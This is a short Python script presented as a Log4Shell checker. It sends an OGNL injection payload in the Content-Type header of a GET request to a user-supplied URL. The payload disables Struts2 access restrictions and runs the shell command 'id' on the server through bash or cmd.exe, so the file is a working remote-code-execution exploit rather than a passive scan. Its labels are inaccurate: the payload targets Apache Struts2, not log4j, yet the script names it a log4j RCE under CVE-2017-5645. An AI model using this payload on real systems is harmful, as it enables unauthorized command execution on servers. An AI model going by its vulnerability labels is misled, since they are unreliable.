# Check-Log4Shell
# Author: cbk914
import argparse
import requests
import re
from urllib.parse import urlparse

# Set up the command-line argument parser
parser = argparse.ArgumentParser(description="Check for log4j RCE vulnerability (CVE-2017-5645)")
parser.add_argument("-t", "--target", required=True, help="Target URL")

# Parse the command-line arguments
args = parser.parse_args()

# Sanitize the input
url = urlparse(args.target)
if url.scheme not in ['http', 'https']:
    parser.error("Invalid target format. Only URLs with http or https scheme are allowed")
if not re.match(r"^[a-zA-Z0-9-.]+$", url.hostname):
    parser.error("Invalid target format. Only URLs with valid hostname are allowed")
if url.hostname in ['localhost', '127.0.0.1']:
    parser.error("Invalid target format. Localhost or internal IP addresses are not allowed")

# Construct the payload
payload = "%{(#_='multipart/form-data')."
payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
payload += "(#_memberAccess?"
payload += "(#_memberAccess=#dm):"
payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
payload += "(#ognlUtil.getExcludedPackageNames().clear())."
payload += "(#ognlUtil.getExcludedClasses().clear())."
payload += "(#context.setMemberAccess(#dm))))."
payload += "(#cmd='id')."
payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))."
payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
payload += "(#ros.flush())}"

# Add the payload to the headers
headers = {"Content-Type": payload}

# Send a GET request to the target website with the modified headers
response = requests.get(args.target, headers=headers)

# Check the response for the payload
if "uid=" in response.text:
	print("Target is vulnerable to log4j RCE (CVE-2017-5645).")
else:
	print("Target is not vulnerable to log4j RCE (CVE-2017-5645).")
